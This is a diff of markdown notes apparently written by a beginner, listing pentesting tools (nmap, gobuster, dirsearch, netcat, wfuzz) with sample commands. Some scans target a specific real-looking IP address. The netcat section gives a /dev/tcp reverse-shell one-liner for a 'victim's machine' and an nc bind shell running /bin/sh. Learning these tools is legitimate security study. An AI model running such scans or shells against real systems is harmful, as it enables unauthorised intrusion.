@@ -1,11 +1,13 @@
 ## Some Usefull Tools of today
 
+### Nmap (scanning & scripts)
 
-#### Nmap (scanning & scripts)
+```sudo nmap -sS 14.139.38.108```  – scans top 1000 ports
 
-```sudo nmap -sS 14.139.38.108 ```  – scans top 1000 ports
 ```sudo nmap -sS -p 80,21,8080 14.139.38.108``` -- for specific ports
-``` sudo nmap -sS -O xx.xxx.xx.xxx``` -O for scanning OS of host
+
+```sudo nmap -sS -O xx.xxx.xx.xxx``` -O for scanning OS of host
+
 ```sudo nmap -sS -D 14.139.38.110 14.139.38.108```   --D for deco
 
 **Using scripts**
@@ -16,13 +18,15 @@
 [cheatsheet](https://cdn.comparitech.com/wp-content/uploads/2019/06/Nmap-Cheat-Sheet.pdf)
 
 **Alternate options**
+
 - [autorecon](https://github.com/Tib3rius/AutoRecon)
 - [rustrecon](https://github.com/RustScan/RustScan)
 
-
 #### Gobuster
+
 eg.
 ```gobuster dir -u http://xx.xxx.xx.xxx/ -w /path/to/wordlist.txt -x .html,.php,.txt,.png```
+
 - **dir** for telling to do directory scan
 - **-u** for URL scan
 - **-w** for wordlist to use for scan
@@ -53,6 +57,7 @@ Global Flags:
   -v, --verbose           Verbose output (errors)
   -w, --wordlist string   Path to the wordlist
   ```
+
   ```
 Usage:
   gobuster dir [flags]
@@ -95,28 +100,36 @@ Global Flags:
   -v, --verbose           Verbose output (errors)
   -w, --wordlist string   Path to the wordlist
   ```
+
 - Refer [link](https://hackertarget.com/gobuster-tutorial/)
 
 **Alternate options**
 
-- [**Dirsearch**](https://github.com/maurosoria/dirsearch)
-[reference](https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/)
+- [**Dirsearch**](https://github.com/maurosoria/dirsearch) 
+
 some commands for reference
-```dirsearch -u http://target--simple-report=report``` 
+
+```dirsearch -u http://target--simple-report=report```
+
 ```dirsearch -u http://target/ --json-report=report```
+
 ```dirsearch -e php,html,js -u https://target -w /path/to/wordlist```   -r for recursive scan
+
 ```./dirsearch.py -u http://testphp.vulnweb.com/ -s 10```   -s for delay
 
+[reference](https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/)
 
-#### Netcat
+### Netcat
 
 **netcat can be used to**
+
 - scan to see if a port is open on a remote system
 - pull the banner from a remote system
 - connect to a network service manually
 - remote administration
 
-__Few key switches__
+**Few key switches**
+
 - **-e** execute
 - **-l** listen mode
 - **-n** numeric mode (no DNS. Its faster)
@@ -124,22 +137,24 @@ __Few key switches__
 - **-u** UDP mode
 - **-v** verbose output
 
-##### Using netcat
-``` ```
-__for chat__
+#### Using netcat
+
+
+**for chat**
 
 ```nc -vn 192.168.1.103 22``` Opening TCP connection between two machines for ```chat```
 
 Netcat is capable of creating a simple TCP or UDP connection between two computers and then open a communication channel between them.
 
 ```nc -l -p 1337```  open a listener on the remote system
+
 ```nc 192.168.1.105 1377```  connect to that listener from a remote machine
 
-__Transferring Files with Netcat__
+**Transferring Files with Netcat**
 
 One of the simple wonders of netcat is its ability to transfer files between computers. By creating this simple connection, we can then use that connection to transfer files between two computers. This can be extremely useful as a network administrator and even more useful as a hacker. Netcat can be used to upload and download files from and to the target system.
 
-``` nc -l -p 6996``` open a listener on the remote system
+```nc -l -p 6996``` open a listener on the remote system
 
 Next, let’s send the file to the remote system.
 
@@ -147,14 +162,15 @@ Next, let’s send the file to the remote system.
 
 Finally, go back to our listening system and we should find that the file has been transferred and appears on the screen!
 
-__Remote Administration with netcat__
+**Remote Administration with netcat**
 
 Probably the most malicious use of netcat *and the most effective for the hacker* is the ability to use netcat for remote administration. We can use netcat’s ability to execute commands to give the **remote connection a shell on the listening system**. Ways to do it ?? [keep exploring....]
 
 ```sudo nc -lvnp 8809``` for listening (in general)
+
 and when the connection command is executed on victim's machine we'll get it's shell access.
 
-```sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5``` _the_ connection command
+```sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5``` *the* connection command
 
 ```nc -l -p6996 -e /bin/sh```  _explore **this** one_ ;)
 
@@ -165,36 +181,40 @@ and when the connection command is executed on victim's machine we'll get it's s
 
 I ain't gonna give explainations for these ;() , jzz find em 🤷‍♂️
 
-
 #### Simplehttpserver
 
 ```sudo python -m http.server 80```
 
-
 #### Wfuzz
 
 some commands for reference
+
 ``` wfuzz -w path/to/wordlist.txt --hc 404,403 http://website.com/FUZZ ```
-- -w for specifying wordlist path
-- --hc for hiding responses having error codes 404, 403
+
+- __-w__ for specifying wordlist path
+- __--hc__ for hiding responses having error codes 404, 403
 - **FUZZ** word used for telling where to use wordlist
 
 for passing cookies in the request
+
 ```wfuzz -z file,path/to/wordlist.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ```
 
 for passing headers
+
 ```wfuzz -z file,path/to/wordlist.txt -H "myheader: headervalue" -H "User-Agent: palemoon" http://example.com/FUZZ```
 
 Additional filters can also be used for filtering displayed requests.
+
 ```--filter "c=200 and l>197"``` will filter to show only status code 200 , length > 197
 
 [explore more](https://github.com/xmendez/wfuzz)
 
+#### Things to explore
 
-###### Things to explore
 - what is hosts file ??
 - 3-way handshake
 - cryptcat
 
-###### Explore later
+#### Explore later
+
 - Rlwrap
